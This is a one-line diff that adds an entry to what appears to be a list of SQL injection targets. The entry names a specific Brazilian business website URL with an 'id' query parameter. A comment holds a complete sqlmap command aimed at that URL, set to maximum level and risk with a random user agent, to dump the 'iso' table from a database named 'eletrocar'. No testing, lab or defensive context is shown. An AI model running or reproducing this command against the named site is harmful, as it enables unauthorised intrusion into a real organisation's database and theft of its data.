@@ -1,0 +1,1 @@
+http://www.eletrocar.com.br/?menu=noticias&id=362 (GET)  # sqlmap.py --threads 10 -v3 --random-agent -u http://www.eletrocar.com.br/?menu=noticias&id=362 -D eletrocar --level 3 --risk 3 -T iso --dump
